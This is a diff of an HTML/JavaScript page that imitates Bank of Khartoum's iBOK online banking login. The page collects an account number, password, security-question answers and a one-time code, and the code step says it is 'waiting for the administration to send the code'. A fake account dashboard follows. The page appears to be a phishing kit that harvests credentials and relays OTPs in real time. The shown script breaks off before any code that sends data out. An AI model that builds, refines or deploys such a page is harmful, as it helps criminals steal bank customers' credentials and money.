@@ -3,27 +3,25 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>iBOK - التحقق الأمني</title>
+    <title>iBOK - تسجيل الدخول</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <style>
-        /* كل الأنماط السابقة كما هي (لم تتغير) */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: 'Cairo', sans-serif;
             background-color: #f5f5f5;
             color: #333;
             line-height: 1.6;
         }
-
-        #loginPage { display: block; }
+        /* الخطوة 1: تسجيل الدخول */
+        #step1 { display: block; }
         .red-banner {
             background-color: #e63946;
             padding: 20px 16px;
@@ -192,8 +190,8 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* صفحة التحقق الأمني */
-        #securityPage {
+        /* الخطوة 2: سؤال الأمان (بدون عداد) */
+        #step2 {
             display: none;
             padding: 20px 16px 30px;
             max-width: 500px;
@@ -297,16 +295,16 @@
             transition: 0.3s;
             min-width: 100px;
         }
+        .btn-next { background: #0a66c2; color: white; }
+        .btn-next:hover { background: #004182; }
         .btn-cancel { background: #f0f0f0; color: #555; }
         .btn-cancel:hover { background: #e0e0e0; }
         .btn-atm { background: #ffc107; color: #333; }
         .btn-atm:hover { background: #e6a800; }
-        .btn-next { background: #0a66c2; color: white; }
-        .btn-next:hover { background: #004182; }
         .btn-security { background: #e63946; color: white; }
         .btn-security:hover { background: #c1121f; }
 
-        /* رسالة الصراف الآلي */
+        /* رسالة الصراف الآلي (تظهر "قريباً") */
         .atm-overlay {
             display: none;
             position: fixed;
@@ -361,8 +359,8 @@
         }
         .atm-box .btn-close-atm:hover { background: #c1121f; }
 
-        /* صفحة OTP */
-        #otpPage {
+        /* ===== الخطوة 3: OTP (بعداد 60 دقيقة) ===== */
+        #step3 {
             display: none;
             padding: 40px 16px 30px;
             max-width: 500px;
@@ -370,7 +368,7 @@
         }
         .otp-header {
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
         .otp-header h1 {
             font-size: 28px;
@@ -384,39 +382,51 @@
             padding: 24px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
-        .otp-timer {
+        .otp-card .otp-title {
             text-align: center;
             font-size: 20px;
             font-weight: 700;
-            color: #c1121f;
-            margin-bottom: 16px;
-            direction: ltr;
+            color: #333;
+            margin-bottom: 8px;
         }
-        .otp-timer i { color: #e63946; margin-left: 8px; }
-        .otp-timer .time {
-            background: #f8f9fa;
-            padding: 4px 16px;
-            border-radius: 30px;
-            display: inline-block;
-        }
-        .otp-message {
+        .otp-card .otp-sub {
             text-align: center;
-            color: #555;
             font-size: 14px;
+            color: #666;
             margin-bottom: 20px;
         }
-        .otp-message i { color: #e63946; margin-left: 6px; }
+        .otp-card .otp-timer {
+            text-align: center;
+            font-size: 36px;
+            font-weight: 800;
+            color: #c1121f;
+            direction: ltr;
+            margin-bottom: 8px;
+        }
+        .otp-card .otp-timer-label {
+            text-align: center;
+            font-size: 14px;
+            color: #888;
+            margin-bottom: 20px;
+        }
+        .otp-card .otp-waiting {
+            text-align: center;
+            font-size: 14px;
+            color: #e63946;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
         .otp-card input {
             width: 100%;
-            padding: 12px 14px;
+            padding: 14px;
             border: 1px solid #ddd;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 18px;
             font-family: 'Cairo', sans-serif;
             background: #fafafa;
             margin-bottom: 16px;
             text-align: center;
-            letter-spacing: 4px;
+            letter-spacing: 6px;
             direction: ltr;
         }
         .otp-card input:focus {
@@ -428,29 +438,206 @@
             display: flex;
             gap: 12px;
             flex-wrap: wrap;
-            margin-top: 8px;
         }
         .otp-actions button {
             flex: 1;
-            padding: 12px;
+            padding: 14px;
             border: none;
             border-radius: 8px;
-            font-size: 14px;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
             font-family: 'Cairo', sans-serif;
             transition: 0.3s;
-            min-width: 100px;
+            min-width: 120px;
         }
-        .btn-resend { background: #0a66c2; color: white; }
-        .btn-resend:hover { background: #004182; }
-        .btn-resend:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-otp-cancel { background: #f0f0f0; color: #555; }
-        .btn-otp-cancel:hover { background: #e0e0e0; }
-        .btn-otp-submit { background: #e63946; color: white; }
-        .btn-otp-submit:hover { background: #c1121f; }
+        .btn-otp-confirm { background: #e63946; color: white; }
+        .btn-otp-confirm:hover { background: #c1121f; }
+        .btn-otp-whatsapp {
+            background: #25D366;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-otp-whatsapp:hover { background: #1da851; }
+        .otp-whatsapp-note {
+            text-align: center;
+            font-size: 13px;
+            color: #888;
+            margin-top: 16px;
+        }
+        .otp-whatsapp-note a {
+            color: #25D366;
+            font-weight: 700;
+            text-decoration: none;
+        }
+        .otp-whatsapp-note a:hover { text-decoration: underline; }
 
-        /* رسائل النظام (بديل alert) */
+        /* ===== الخطوة 4: لوحة التحكم ===== */
+        #step4 {
+            display: none;
+            padding: 20px 16px 30px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        .dashboard-header {
+            background: linear-gradient(135deg, #c1121f, #e63946);
+            padding: 20px 16px 30px;
+            color: white;
+            border-radius: 0 0 30px 30px;
+            margin-bottom: 20px;
+        }
+        .dashboard-header .top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        .dashboard-header .top .logo {
+            font-size: 24px;
+            font-weight: 800;
+        }
+        .dashboard-header .top .logo span { color: #ffc107; }
+        .dashboard-header .top .icons {
+            display: flex;
+            gap: 16px;
+            font-size: 20px;
+        }
+        .dashboard-header .top .icons i { cursor: pointer; }
+        .dashboard-header .top .icons i:hover { color: #ffc107; }
+        .dashboard-header .user {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .dashboard-header .user .avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #ffc107;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 800;
+            color: #c1121f;
+        }
+        .dashboard-header .user .name { font-size: 20px; font-weight: 700; }
+        .dashboard-header .user .greeting { font-size: 14px; opacity: 0.9; }
+
+        .search-bar {
+            background: white;
+            border-radius: 12px;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            margin-bottom: 20px;
+        }
+        .search-bar i { color: #999; font-size: 18px; }
+        .search-bar input {
+            border: none;
+            outline: none;
+            flex: 1;
+            font-size: 14px;
+            font-family: 'Cairo', sans-serif;
+            background: transparent;
+        }
+
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .quick-actions .item {
+            background: white;
+            border-radius: 12px;
+            padding: 14px 8px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .quick-actions .item:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12);
+        }
+        .quick-actions .item i { font-size: 24px; color: #e63946; margin-bottom: 4px; }
+        .quick-actions .item span { font-size: 11px; font-weight: 600; color: #333; display: block; }
+
+        .menu-list {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+            overflow: hidden;
+        }
+        .menu-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 16px 18px;
+            border-bottom: 1px solid #f0f0f0;
+            cursor: pointer;
+            transition: 0.2s;
+            color: #333;
+        }
+        .menu-item:last-child { border-bottom: none; }
+        .menu-item:hover { background: #f8f9fa; }
+        .menu-item i { width: 22px; font-size: 18px; color: #e63946; text-align: center; }
+        .menu-item .text { flex: 1; font-size: 15px; font-weight: 500; }
+        .menu-item .arrow { color: #ccc; font-size: 14px; }
+
+        /* ===== Footer ===== */
+        .footer {
+            background-color: #f0f0f0;
+            padding: 30px 16px 24px;
+            text-align: center;
+            margin-top: 30px;
+        }
+        .footer-text {
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+        .footer-text .bank-name { color: #c1121f; }
+        .footer-text .ibok { color: #e63946; }
+        .footer-text .pipe { color: #c9a84b; margin: 0 4px; }
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            flex-wrap: wrap;
+        }
+        .social-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 22px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        .social-icon:hover {
+            transform: translateY(-6px) scale(1.05);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
+        }
+        .whatsapp { background: #25D366; }
+        .whatsapp:hover { background: #1da851; }
+        .facebook { background: linear-gradient(135deg, #1877f2, #0a66c2); }
+        .linkedin { background: linear-gradient(135deg, #0A66C2, #004182); }
+        .instagram { background: radial-gradient(circle at 30% 30%, #fdf497, #fd5949, #d6249f, #285aeb); }
+
+        /* رسائل النظام */
         .system-message {
             display: none;
             padding: 14px 18px;
@@ -483,7 +670,7 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* الروابط السفلية */
+        /* روابط السفلية */
         .security-links {
             display: flex;
             justify-content: center;
@@ -503,54 +690,6 @@
         .security-links a:hover { color: #e63946; }
         .security-links .highlight { color: #c1121f; font-weight: 700; }
 
-        /* Footer */
-        .footer {
-            background-color: #f0f0f0;
-            padding: 30px 16px 24px;
-            text-align: center;
-            margin-top: 30px;
-        }
-        .footer-text {
-            font-size: 15px;
-            color: #333;
-            margin-bottom: 20px;
-            font-weight: 700;
-        }
-        .footer-text .bank-name { color: #c1121f; }
-        .footer-text .ibok { color: #e63946; }
-        .footer-text .pipe { color: #c9a84b; margin: 0 4px; }
-        .social-icons {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 18px;
-            flex-wrap: wrap;
-        }
-        .social-icon {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 22px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-decoration: none;
-            border: none;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-        }
-        .social-icon:hover {
-            transform: translateY(-6px) scale(1.05);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
-        }
-        .whatsapp { background: #25D366; }
-        .whatsapp:hover { background: #1da851; }
-        .facebook { background: linear-gradient(135deg, #1877f2, #0a66c2); }
-        .linkedin { background: linear-gradient(135deg, #0A66C2, #004182); }
-        .instagram { background: radial-gradient(circle at 30% 30%, #fdf497, #fd5949, #d6249f, #285aeb); }
-
         @media (max-width: 480px) {
             .banner-content { flex-direction: column; gap: 12px; }
             .banner-text { text-align: center; }
@@ -561,12 +700,12 @@
             .overlay .loading-spinner { width: 50px; height: 50px; }
             .security-actions button { font-size: 12px; padding: 10px; min-width: 80px; }
             .security-header h1 { font-size: 24px; }
-            .security-card .question-box { font-size: 14px; }
-            .atm-box .big-text { font-size: 24px; }
-            .atm-box .sub-text { font-size: 16px; }
-            .otp-header h1 { font-size: 24px; }
-            .otp-timer { font-size: 18px; }
-            .otp-actions button { font-size: 12px; padding: 10px; min-width: 80px; }
+            .otp-card .otp-timer { font-size: 28px; }
+            .otp-actions button { font-size: 14px; padding: 12px; min-width: 100px; }
+            .quick-actions { grid-template-columns: repeat(4, 1fr); gap: 8px; }
+            .quick-actions .item { padding: 10px 4px; }
+            .quick-actions .item i { font-size: 20px; }
+            .quick-actions .item span { font-size: 10px; }
         }
     </style>
 </head>
@@ -578,8 +717,8 @@
         <div class="loading-spinner"></div>
     </div>
 
-    <!-- ===== صفحة تسجيل الدخول ===== -->
-    <div id="loginPage">
+    <!-- ===== الخطوة 1: تسجيل الدخول ===== -->
+    <div id="step1">
         <div class="red-banner">
             <div class="banner-content">
                 <div class="logo-section">
@@ -592,84 +731,58 @@
                 </div>
             </div>
         </div>
-
-        <div class="yellow-banner">
-            مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت
-        </div>
-
+        <div class="yellow-banner">مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت</div>
         <div class="dark-red-line"></div>
-
         <div class="container">
             <h1 class="login-title">تسجيل الدخول</h1>
-
             <div class="form-card">
-                <div class="form-header">
-                    <h3>الرجاء إدخال البيانات</h3>
-                </div>
-
+                <div class="form-header"><h3>الرجاء إدخال البيانات</h3></div>
                 <form id="loginForm">
                     <div class="form-group">
                         <label for="accountNumber">رقم الحساب:</label>
                         <input type="text" id="accountNumber" placeholder="أدخل 7 أرقام فقط" maxlength="7" required inputmode="numeric" />
                         <small style="color: #888; font-size: 12px; display: block; margin-top: 4px;">مثال: 1234567</small>
                     </div>
-
                     <div class="form-group">
                         <label for="password">كلمة المرور:</label>
                         <div class="password-input-wrapper">
                             <input type="password" id="password" placeholder="أدخل كلمة المرور" required />
-                            <button type="button" class="password-toggle" onclick="togglePassword()">
-                                <i class="fas fa-eye"></i>
-                            </button>
+                            <button type="button" class="password-toggle" onclick="togglePassword()"><i class="fas fa-eye"></i></button>
                         </div>
-                        <small style="color: #888; font-size: 12px; display: block; margin-top: 4px;">
-                            يجب أن تحتوي على: 8 أحرف كحد أدنى، حرف كبير، حرف صغير، رقم، وعلامة خاصة (@ # $ &)
-                        </small>
+                        <small style="color: #888; font-size: 12px; display: block; margin-top: 4px;">8 أحرف، حرف كبير، صغير، رقم، علامة خاصة (@ # $ &)</small>
                     </div>
-
-                    <div class="forgot-password">
-                        <a href="#">نسبت كلمة المرور</a>
-                    </div>
-
+                    <div class="forgot-password"><a href="#">نسبت كلمة المرور</a></div>
                     <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                 </form>
-
                 <div class="error-message-simple" id="errorMessageSimple"></div>
             </div>
         </div>
     </div>
 
-    <!-- ===== صفحة التحقق الأمني ===== -->
-    <div id="securityPage">
+    <!-- ===== الخطوة 2: سؤال الأمان ===== -->
+    <div id="step2">
         <div class="security-header">
             <h1><i class="fas fa-shield-alt"></i> بنك bankak</h1>
             <div class="sub">استلام الأمان</div>
         </div>
-
         <div class="security-card">
             <div class="warning-box">
                 <div class="title"><i class="fas fa-exclamation-triangle"></i> ترغب في استخدام موبايل مختلف؟</div>
                 <div class="desc">اذا كنت تحاول الدخول من جهاز موبايل مختلف (غير الموبايل المسجل) أضغط على زر إعادة التعيين واتبع التعليمات</div>
             </div>
-
             <div class="question-label">
                 <i class="fas fa-question-circle"></i> الإجابة على أسئلة الأماكن
                 <small>اختر الإجابة الصحيحة للسؤال التالي:</small>
             </div>
-
             <div class="question-box" id="questionText">ما هو اسم المدرسة التي التحقت بها؟</div>
-
             <input type="text" id="securityAnswer" placeholder="أدخل الجواب" />
-
             <div class="system-message" id="securitySystemMessage"></div>
-
             <div class="security-actions">
                 <button class="btn-next" onclick="nextQuestion()">سؤال آخر</button>
                 <button class="btn-atm" onclick="showAtmMessage()">باستخدام بطاقة الصراف الآلي</button>
                 <button class="btn-cancel" onclick="cancelSecurity()">إلغاء</button>
                 <button class="btn-security" onclick="verifySecurity()">إرسال</button>
             </div>
-
             <div class="security-links">
                 <a href="#">فيس بوك</a>
                 <a href="#">المساعدة</a>
@@ -679,7 +792,7 @@
         </div>
     </div>
 
-    <!-- ===== رسالة الصراف الآلي ===== -->
+    <!-- ===== رسالة الصراف الآلي (قريباً) ===== -->
     <div class="atm-overlay" id="atmOverlay">
         <div class="atm-box">
             <i class="fas fa-credit-card"></i>
@@ -689,32 +802,70 @@
         </div>
     </div>
 
-    <!-- ===== صفحة OTP ===== -->
-    <div id="otpPage">
+    <!-- ===== الخطوة 3: OTP (بعداد 60 دقيقة) ===== -->
+    <div id="step3">
         <div class="otp-header">
-            <h1><i class="fas fa-shield-alt"></i> بنك bankak</h1>
+            <h1><i class="fas fa-shield-alt"></i> بنك | Bank Online | Bank of America</h1>
         </div>
-
         <div class="otp-card">
-            <div class="otp-timer">
-                <i class="fas fa-clock"></i>
-                <span class="time" id="timerDisplay">60:00</span>
-            </div>
-
-            <div class="otp-message">
-                <i class="fas fa-envelope"></i>
-                تم إرسال الرمز السري (OTP) إلى رقم هاتفك المسجل/البريد الإلكتروني.
-            </div>
-
-            <input type="text" id="otpInput" placeholder="أدخل الرمز السري (OTP)" maxlength="6" inputmode="numeric" />
-
+            <div class="otp-title">رمز التحقق</div>
+            <div class="otp-sub">أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك</div>
+            <div class="otp-timer" id="otpTimerDisplay">60:00</div>
+            <div class="otp-timer-label">دقائق متبقية</div>
+            <div class="otp-waiting">في انتظار إرسال رمز التحقق من الإدارة...</div>
+            <input type="text" id="otpInput" placeholder="أدخل الرمز" maxlength="6" inputmode="numeric" />
             <div class="system-message" id="otpSystemMessage"></div>
-
             <div class="otp-actions">
-                <button class="btn-resend" id="resendBtn" onclick="resendOtp()">إعادة إرسال</button>
-                <button class="btn-otp-cancel" onclick="cancelOtp()">إلغاء</button>
-                <button class="btn-otp-submit" onclick="submitOtp()">إرسال</button>
+                <button class="btn-otp-confirm" onclick="submitOtp()">تأكيد الرمز</button>
+                <button class="btn-otp-whatsapp" onclick="whatsappContact()"><i class="fab fa-whatsapp"></i> واتساب</button>
             </div>
+            <div class="otp-whatsapp-note">لم تستلم الرمز؟ <a href="#" onclick="whatsappContact()">تواصل معنا على واتساب</a></div>
+        </div>
+    </div>
+
+    <!-- ===== الخطوة 4: لوحة التحكم ===== -->
+    <div id="step4">
+        <div class="dashboard-header">
+            <div class="top">
+                <div class="logo">i<span>BOK</span></div>
+                <div class="icons">
+                    <i class="fas fa-bell" onclick="alert('لا توجد إشعارات')"></i>
+                    <i class="fas fa-sign-out-alt" onclick="logout()"></i>
+                </div>
+            </div>
+            <div class="user">
+                <div class="avatar">A</div>
+                <div>
+                    <div class="greeting">مساء الخير،</div>
+                    <div class="name">ABDALWHAB DBDAWI</div>
+                </div>
+            </div>
+        </div>
+        <div class="search-bar">
+            <i class="fas fa-search"></i>
+            <input type="text" placeholder="بحث في الخدمات..." />
+        </div>
+        <div class="quick-actions">
+            <div class="item" onclick="alert('تفاصيل الحساب')"><i class="fas fa-user"></i><span>الحساب</span></div>
+            <div class="item" onclick="alert('دفع فواتير')"><i class="fas fa-file-invoice"></i><span>فواتير</span></div>
+            <div class="item" onclick="alert('تحويلات')"><i class="fas fa-exchange-alt"></i><span>تحويل</span></div>
+            <div class="item" onclick="alert('سحب بدون بطاقة')"><i class="fas fa-credit-card"></i><span>سحب</span></div>
+        </div>
+        <div class="menu-list">
+            <div class="menu-item" onclick="alert('تفاصيل الحساب')"><i class="fas fa-user-circle"></i><span class="text">تفاصيل الحساب</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('دفع فواتير')"><i class="fas fa-file-invoice"></i><span class="text">دفع فواتير</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('تحويلات')"><i class="fas fa-exchange-alt"></i><span class="text">تحويلات</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('سحب بدون بطاقة')"><i class="fas fa-credit-card"></i><span class="text">سحب بدون بطاقة</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('بنكك PAY')"><i class="fas fa-mobile-alt"></i><span class="text">بنكك PAY</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('طلب الودائع الاستثمارية')"><i class="fas fa-piggy-bank"></i><span class="text">طلب الودائع الاستثمارية</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('إدارة المستفيدين')"><i class="fas fa-users"></i><span class="text">إدارة المستفيدين</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('المعاملات السابقة')"><i class="fas fa-history"></i><span class="text">المعاملات السابقة</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('إدارة البطاقات')"><i class="fas fa-id-card"></i><span class="text">إدارة البطاقات</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('طلبات')"><i class="fas fa-clipboard-list"></i><span class="text">طلبات</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('أمر دفع دائم')"><i class="fas fa-clock"></i><span class="text">أمر دفع دائم</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('الضبط')"><i class="fas fa-cog"></i><span class="text">الضبط</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('التجارة الإلكترونية')"><i class="fas fa-shopping-cart"></i><span class="text">التجارة الإلكترونية</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
+            <div class="menu-item" onclick="alert('خدمات العملات الأجنبية')"><i class="fas fa-dollar-sign"></i><span class="text">خدمات العملات الأجنبية</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
         </div>
     </div>
 
@@ -726,25 +877,16 @@
             <span class="bank-name">بنك الخرطوم</span>
             <span class="ibok"> iBOK</span>
         </div>
-
         <div class="social-icons">
-            <a href="https://wa.me/249116001913" target="_blank" class="social-icon whatsapp" title="واتساب">
-                <i class="fab fa-whatsapp"></i>
-            </a>
-            <a href="https://www.facebook.com/BankofKhartoum1913" target="_blank" class="social-icon facebook" title="فيسبوك">
-                <i class="fab fa-facebook-f"></i>
-            </a>
-            <a href="https://www.linkedin.com/company/bank-of-khartoum/" target="_blank" class="social-icon linkedin" title="لينكدإن">
-                <i class="fab fa-linkedin-in"></i>
-            </a>
-            <a href="https://www.instagram.com/bank_of_khartoum?igsh=MWN2bmlmZ2gya21m" target="_blank" class="social-icon instagram" title="إنستغرام">
-                <i class="fab fa-instagram"></i>
-            </a>
+            <a href="https://wa.me/249116001913" target="_blank" class="social-icon whatsapp"><i class="fab fa-whatsapp"></i></a>
+            <a href="https://www.facebook.com/BankofKhartoum1913" target="_blank" class="social-icon facebook"><i class="fab fa-facebook-f"></i></a>
+            <a href="https://www.linkedin.com/company/bank-of-khartoum/" target="_blank" class="social-icon linkedin"><i class="fab fa-linkedin-in"></i></a>
+            <a href="https://www.instagram.com/bank_of_khartoum" target="_blank" class="social-icon instagram"><i class="fab fa-instagram"></i></a>
         </div>
     </div>
 
     <script>
-        // ===== قائمة الأسئلة النهائية (15 سؤالاً بدون مكررات) =====
+        // قائمة الأسئلة الأمنية (15 سؤالاً)
         const securityQuestions = [
             "ما هو اسم المدرسة التي التحقت بها؟",
             "اسم فريق كرة القدم المفضل لديك؟",
@@ -767,148 +909,20 @@
         let timerInterval = null;
         let timeSeconds = 3600; // 60 دقيقة
 
-        // ===== عرض رسالة النظام =====
+        // ===== عرض رسائل النظام =====
         function showSystemMessage(elementId, message, type = 'error') {
             const el = document.getElementById(elementId);
             el.textContent = message;
             el.className = 'system-message active ' + type;
             if (type === 'info' || type === 'success') {
-                setTimeout(() => {
-                    el.classList.remove('active');
-                }, 5000);
+                setTimeout(() => { el.classList.remove('active'); }, 5000);
             }
         }
-
         function hideSystemMessage(elementId) {
             document.getElementById(elementId).classList.remove('active');
         }
 
-        // ===== تحديث السؤال =====
-        function updateQuestion() {
-            document.getElementById('questionText').textContent = securityQuestions[currentQuestionIndex];
-            document.getElementById('securityAnswer').value = '';
-            document.getElementById('securityAnswer').focus();
-            hideSystemMessage('securitySystemMessage');
-        }
-
-        // ===== السؤال التالي =====
-        function nextQuestion() {
-            currentQuestionIndex = (currentQuestionIndex + 1) % securityQuestions.length;
-            updateQuestion();
-        }
-
-        // ===== التحقق من إجابة الأمان =====
-        function verifySecurity() {
-            const answer = document.getElementById('securityAnswer').value.trim();
-            hideSystemMessage('securitySystemMessage');
-            if (answer === '') {
-                showSystemMessage('securitySystemMessage', 'الرجاء إدخال الإجابة على سؤال الأمان', 'error');
-                return;
-            }
-            showSystemMessage('securitySystemMessage', '✅ تم التحقق من الإجابة بنجاح', 'success');
-            setTimeout(() => {
-                document.getElementById('securityPage').style.display = 'none';
-                document.getElementById('otpPage').style.display = 'block';
-                document.getElementById('footer').style.marginTop = '0';
-                startTimer();
-                hideSystemMessage('securitySystemMessage');
-            }, 1000);
-        }
-
-        // ===== إلغاء =====
-        function cancelSecurity() {
-            document.getElementById('securityPage').style.display = 'none';
-            document.getElementById('loginPage').style.display = 'block';
-            document.getElementById('footer').style.marginTop = '30px';
-            document.getElementById('accountNumber').value = '';
-            document.getElementById('password').value = '';
-            document.getElementById('securityAnswer').value = '';
-            hideSystemMessage('securitySystemMessage');
-        }
-
-        // ===== رسالة الصراف الآلي =====
-        function showAtmMessage() {
-            document.getElementById('atmOverlay').classList.add('active');
-        }
-
-        function closeAtmMessage() {
-            document.getElementById('atmOverlay').classList.remove('active');
-        }
-
-        // ===== المؤقت (60 دقيقة) =====
-        function startTimer() {
-            timeSeconds = 3600;
-            updateTimerDisplay();
-            if (timerInterval) clearInterval(timerInterval);
-            timerInterval = setInterval(function() {
-                timeSeconds--;
-                updateTimerDisplay();
-                if (timeSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    timerInterval = null;
-                    document.getElementById('resendBtn').disabled = false;
-                }
-            }, 1000);
-            document.getElementById('resendBtn').disabled = true;
-        }
-
-        function updateTimerDisplay() {
-            const mins = Math.floor(timeSeconds / 60);
-            const secs = timeSeconds % 60;
-            document.getElementById('timerDisplay').textContent = 
-                String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
-        }
-
-        // ===== إعادة إرسال OTP =====
-        function resendOtp() {
-            if (timerInterval) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-            }
-            timeSeconds = 3600;
-            updateTimerDisplay();
-            document.getElementById('resendBtn').disabled = true;
-            timerInterval = setInterval(function() {
-                timeSeconds--;
-                updateTimerDisplay();
-                if (timeSeconds <= 0) {
-                    clearInterval(timerInterval);
-                    timerInterval = null;
-                    document.getElementById('resendBtn').disabled = false;
-                }
-            }, 1000);
-            showSystemMessage('otpSystemMessage', '🔄 تم إعادة إرسال الرمز السري', 'info');
-        }
-
-        // ===== إلغاء OTP =====
-        function cancelOtp() {
-            if (timerInterval) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-            }
-            document.getElementById('otpPage').style.display = 'none';
-            document.getElementById('loginPage').style.display = 'block';
-            document.getElementById('footer').style.marginTop = '30px';
-            document.getElementById('otpInput').value = '';
-            hideSystemMessage('otpSystemMessage');
-        }
-
-        // ===== إرسال OTP =====
-        function submitOtp() {
-            const otp = document.getElementById('otpInput').value.trim();
-            hideSystemMessage('otpSystemMessage');
-            if (otp === '') {
-                showSystemMessage('otpSystemMessage', 'الرجاء إدخال الرمز السري', 'error');
-                return;
-            }
-            if (otp.length < 4) {
-                showSystemMessage('otpSystemMessage', 'الرمز السري يجب أن يكون 4-6 أرقام', 'error');
-                return;
-            }
-            showSystemMessage('otpSystemMessage', '✅ تم التحقق بنجاح!', 'success');
-        }
-
-        // ===== إظهار/إخفاء كلمة المرور =====
+        // ===== تسجيل الدخول (الخطوة 1) =====
         function togglePassword() {
             const input = document.getElementById('password');
             const icon = document.querySelector('.password-toggle i');
@@ -921,101 +935,181 @@
             }
         }
 
-        // ===== Overlay =====
-        function showOverlay() {
-            document.getElementById('overlay').classList.add('active');
-            document.getElementById('loginBtn').disabled = true;
+        function showError(message) {
+            const el = document.getElementById('errorMessageSimple');
+            el.innerText = message;
+            el.classList.add('active');
+        }
+        function clearMessages() {
             document.getElementById('errorMessageSimple').classList.remove('active');
         }
 
+        function showOverlay() {
+            document.getElementById('overlay').classList.add('active');
+            document.getElementById('loginBtn').disabled = true;
+        }
         function hideOverlay() {
             document.getElementById('overlay').classList.remove('active');
             document.getElementById('loginBtn').disabled = false;
         }
 
-        function showError(message) {
-            const errorEl = document.getElementById('errorMessageSimple');
-            errorEl.innerText = message;
-            errorEl.classList.add('active');
-        }
-
-        function clearMessages() {
-            document.getElementById('errorMessageSimple').classList.remove('active');
-        }
-
-        // ===== تسجيل الدخول =====
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             const acc = document.getElementById('accountNumber').value.trim();
             const pass = document.getElementById('password').value;
-
             clearMessages();
 
             if (!/^\d{7}$/.test(acc)) {
                 showError('رقم الحساب غير صحيح.\nالرجاء إدخال 7 أرقام فقط (مثال: 1234567)');
                 return;
             }
-
             const errors = [];
             if (pass.length < 8) errors.push('• 8 أحرف على الأقل');
             if (!/[A-Z]/.test(pass)) errors.push('• حرف كبير (A-Z)');
             if (!/[a-z]/.test(pass)) errors.push('• حرف صغير (a-z)');
             if (!/\d/.test(pass)) errors.push('• رقم (0-9)');
             if (!/[&$#@]/.test(pass)) errors.push('• علامة خاصة (& $ # @)');
-
             if (errors.length > 0) {
